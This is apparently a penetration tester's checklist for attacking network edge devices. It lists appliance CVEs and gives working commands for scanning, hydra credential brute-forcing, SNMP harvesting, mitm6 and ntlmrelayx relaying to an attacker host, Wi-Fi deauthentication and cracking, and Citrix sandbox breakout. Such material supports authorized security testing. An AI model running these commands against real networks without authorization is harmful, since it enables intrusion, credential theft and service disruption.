# Network Infrastructure & Edge Devices

The perimeter appliance is usually the fastest way into an internal network. Version-check everything before you fuzz anything.

## 1. Discovery

```bash
nmap -sV -Pn -p 443,8443,4443,10443,8080,80 --open 10.10.10.0/24
nmap --script ssl-cert -p 443 10.10.10.10
whatweb -a 3 https://10.10.10.10
```

- [ ] TLS certificate CN/SAN — often names the product and internal hostname
- [ ] Login page title, favicon hash, JS bundle path
- [ ] `Server` header, error page fingerprint
- [ ] Default ports per vendor

## 2. Appliance CVEs

| Product | Port | Notable |
| --- | --- | --- |
| Citrix NetScaler/ADC | 443 | CVE-2023-4966 (Citrix Bleed), CVE-2019-19781, CVE-2023-3519 |
| Fortinet FortiGate SSL-VPN | 443, 10443 | CVE-2018-13379 (creds), CVE-2022-42475, CVE-2023-27997 |
| Ivanti Connect Secure | 443 | CVE-2023-46805 + CVE-2024-21887, CVE-2025-0282 |
| Pulse Secure | 443 | CVE-2019-11510, CVE-2021-22893 |
| F5 BIG-IP | 443 | CVE-2020-5902, CVE-2022-1388, CVE-2023-46747 |
| SonicWall | 443 | CVE-2021-20038, CVE-2024-40766 |
| Cisco ASA | 443 | CVE-2018-0101, CVE-2020-3187 |
| VMware vCenter | 443, 5480 | CVE-2021-21972, CVE-2021-22005 |
| MOVEit Transfer | 443 | CVE-2023-34362 |
| Atlassian Confluence | 8090, 443 | CVE-2023-22515, CVE-2023-22518 |
| Exchange | 443 | ProxyLogon, ProxyShell |
| Zimbra | 443 | CVE-2022-27925, CVE-2023-37580 |

Workflow: fingerprint version → map to CVE → check public PoC → confirm vulnerable path → exploit with the least destructive payload → establish access → pivot.

```bash
nuclei -u https://10.10.10.10 -tags citrix,fortinet,ivanti,f5,sonicwall
searchsploit "fortinet ssl vpn"
```

## 3. Default credentials

```bash
# Try product defaults before anything else
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  -s 443 -S -f 10.10.10.10 https-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

Common: `admin:admin`, `admin:password`, `root:root`, `cisco:cisco`, `admin:<serial>`, `admin:<hostname>`.

## 4. VPN → internal

Once on the VPN concentrator:

- Dump the config: user database, group policies, split-tunnel routes, PSK, certificates.
- Use the appliance as a pivot: `ssh`/`sslvpn` tunnel, or add routes on the attacker host.
- Client certificate extraction → connect as a legitimate user.
- Check for cached session tokens (Citrix Bleed pattern) — reuse instead of cracking.

## 5. Citrix breakout

On a Citrix session, the goal is to escape the published app/desktop sandbox:

```cmd
# enumerate what is reachable
whoami /all; query user; net use
dir C:\Users\Public
# breakout paths
# - published desktop instead of app
# - Explorer.exe / cmd.exe via "Save As" dialogs
# - drive redirection to write to client
# - clipboard / printer redirection
# - registry write to launch on next logon
```

## 6. Network devices

- SNMP `public`/`private` → config download, ARP table, routes, interface list
- Cisco: `enable` with type-7 password (`cisco7` decoder), `service password-encryption` is reversible
- Switch: VLAN hopping (double tagging), DTP, VTP, CDP/LLDP leakage
- Router: `enable secret` type 5/9 hash → `hashcat`
- 802.1X: MAB bypass, hub between phone and PC, NAC bypass

```bash
snmpwalk -v2c -c public 10.10.10.1
onesixtyone -c communities.txt 10.10.10.1
```

## 7. IPv6 and name resolution

```bash
# mitm6 on an internal segment
mitm6 -d corp.local
# then relay
impacket-ntlmrelayx -6 -tf relay.txt -wh attacker.corp.local -smb2support
```

IPv6 is frequently unmanaged and preferred over IPv4 — a reliable path to credentials on flat networks.

## 8. Wireless (if in scope)

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
sudo aircrack-ng -w rockyou.txt capture.cap
# WPA-Enterprise
sudo hostapd-wpe hostapd.conf   # capture MSCHAPv2 → crack
```

## 9. Reporting note

Appliance findings are usually critical because they sit at the trust boundary. Include the firmware version, the exact CVE, whether exploitation was confirmed, and the blast radius (which internal networks the appliance can reach).

## 10. Triage order

1. Fingerprint and version every edge device.
2. Match to known CVE, check for public PoC.
3. Default credentials.
4. SNMP and management interfaces.
5. IPv6/name-resolution poisoning on the internal side.
6. Citrix/RDP breakout once inside.
